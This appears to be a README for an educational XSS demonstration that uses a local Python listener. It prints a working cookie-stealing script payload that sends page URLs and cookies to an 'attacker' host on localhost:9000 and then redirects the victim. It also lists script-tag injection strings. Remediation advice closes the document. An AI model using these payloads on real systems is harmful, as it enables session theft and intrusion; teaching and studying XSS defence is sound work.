XSS Attack Demonstration Project
Overview
This project demonstrates how a Cross-Site Scripting (XSS) attack works using a simple Python HTTP server.
It includes:
A vulnerable web page that reflects unescaped user input.
A malicious script that steals cookies and redirects users.
A landing page served by a local listener to visualize the redirection.
The goal is to help demonstrate how unsanitized input leads to script injection and how to prevent it.
Technical Principle
XSS (Cross-Site Scripting) occurs when user input is inserted into a web page without proper escaping or validation.
In this demo:
The attacker injects a <script> payload into a vulnerable web page.
The script sends sensitive information (like cookies or URL data) to the attacker's server (here simulated on localhost:9000).
The user is then redirected to a landing page served by the same listener.
The core mechanism is:
<script>
(function(){
  var ATTACKER = "http://localhost:9000";
  var info = "u=" + encodeURIComponent(location.href) + "&c=" + encodeURIComponent(document.cookie || "");
  var img = new Image();
  img.src = ATTACKER + "/steal?" + info + "&_t=" + Date.now();
  setTimeout(function(){ location.replace(ATTACKER + "/landing.html"); }, 300);
})();
</script>
How to Run
1. Start the local listener
Run the Python receiver (e.g., toy_receiver.py):
python3 toy_receiver.py
It listens on port 9000 and provides:
/steal — to log stolen data.
/landing.html — to display the landing page.
2. Open the vulnerable page
In your browser, visit the vulnerable HTML page (for example vuln.html) that accepts unescaped input.
Try injecting:
<script src="http://localhost:9000/steal.js"></script>
or directly:
<script>alert('Hacked!');</script>
3. Observe the result
The listener console will show incoming /steal requests (simulating stolen data).
The browser will be redirected to the Landing Page (Demo).
Restoring to the Clean (Uninfected) Page
To recover the web page to its original, unpolluted state:
Remove any injected <script> tags or suspicious HTML content from the vulnerable input fields or database.
Refresh the page — it should now load normally without redirection.
(Optional) Clear browser cache and cookies if previous attacks stored any data.
For long-term protection:
Sanitize all user inputs.
Encode dynamic output before inserting into HTML.
Use a Content Security Policy (CSP) to restrict scripts.
📚 Educational Purpose Only
This project is for educational and security research demonstration only.
Do not deploy it on public servers or use it against real websites.